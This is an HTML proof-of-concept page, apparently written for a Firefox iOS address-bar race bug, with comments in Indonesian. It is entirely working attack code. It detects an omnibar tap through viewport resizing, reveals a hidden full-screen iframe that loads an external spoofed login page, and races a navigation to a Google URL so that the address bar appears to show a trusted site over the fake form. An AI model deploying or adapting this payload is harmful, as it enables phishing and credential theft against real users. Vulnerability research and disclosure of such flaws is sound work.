<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Firefox iOS Omnibar Race PoC</title>

<style>
body {
  margin:0;
  font-family:-apple-system, BlinkMacSystemFont, system-ui;
  background:#f5f5f7;
  text-align:center;
  padding-top:120px;
}
iframe {
  width:100%;
  height:100vh;
  border:0;
  display:none;
}
</style>
</head>

<body>

<h3>
Firefox iOS — tap omnibar untuk trigger iframe → navigasi ke Google
</h3>

<iframe
  id="frame"
  src="https://cnfdnfial-ops.github.io/spoof/login.html"
  sandbox="allow-scripts allow-forms allow-same-origin">
</iframe>

<script>
let triggered = false;
let lastHeight = window.innerHeight;
const frame = document.getElementById('frame');

function onOmnibarLikely() {
  if (triggered) return;

  // omnibar tap biasanya bikin viewport shrink
  if (window.innerHeight < lastHeight) {
    triggered = true;

    // tampilkan iframe dulu
    frame.style.display = 'block';

    // lalu race navigate ke google
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          location.href = 'https://google.com:90';
        }, 50);
      });
    });
  }

  lastHeight = window.innerHeight;
}

window.addEventListener('resize', onOmnibarLikely);
window.addEventListener('focus', onOmnibarLikely);
window.addEventListener('scroll', onOmnibarLikely);
</script>

</body>
</html>
